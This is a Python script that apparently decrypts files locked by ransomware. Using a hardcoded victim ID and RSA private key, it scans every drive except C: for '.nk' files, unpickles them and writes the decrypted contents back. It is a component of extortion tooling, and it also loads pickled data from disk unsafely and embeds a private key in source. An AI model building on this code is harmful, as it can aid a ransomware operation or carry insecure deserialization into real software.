global privateKey
m_id = '1234567891'
privateKey = 'PrivateKey(123856659405824364660477649411782045758906835625822655717961389160498175236921222980863613180174697764224713319734635168067299554697122124970909816331138583771057802225905556931084417353032560984842978585659161804011931457077858018765596702552526633000402871052524454021152082253624957827237217402771973264011, 65537, 76915973895015728783996518812428360778518230970831076568431734401072908951698381892643364707263530895618987860290826810888063606460750009371668771624609941002414374912800220089055977563061896118526044612007070569252279726875402476491063803822344623372749473754376157035010736645796933713756588271151065056937, 57222510320091969102829062093023370687281141106905346915770693459175579065336628226459103231012933826828980627457733491630531104163707703659107092281692088115579173, 2164474412481967112180778957803915793379915519972910945275705700453202874092500711657333618941134444745070344764965843320273537758002965551322607)'

import os
import rsa
import pickle

t = privateKey.split(', ')
n = int((t[0])[11:])
e = int(t[1])
d = int(t[2])
p = int(t[3])
q = int((t[4])[:-1])

def decrypt():
    global privateKey

    pk = rsa.key.PrivateKey(n, e, d, p, q)

    for part in range(65, 91):
        if part != 67:
            partpath = chr(part) + ":\\"
            for dirpath, dirs, files in os.walk(partpath, topdown = True):
                dirpath = dirpath + "\\"
                for filename in files:
                    fname = dirpath + filename
                    chk = ".nk"
                    if fname[-3:] == chk:
                        nfname = fname[:-3]
                        try:
                            with open(fname, 'rb') as f:
                                data = pickle.load(f)
                            os.rename(fname, nfname)
                            with open(nfname, 'wb') as f:
                                pass
                            for i in range(len(data)):
                                pt = rsa.decrypt(data[i], pk)
                                with open(nfname, 'ab') as f:
                                    f.write(pt)
                        except:
                            pass

decrypt()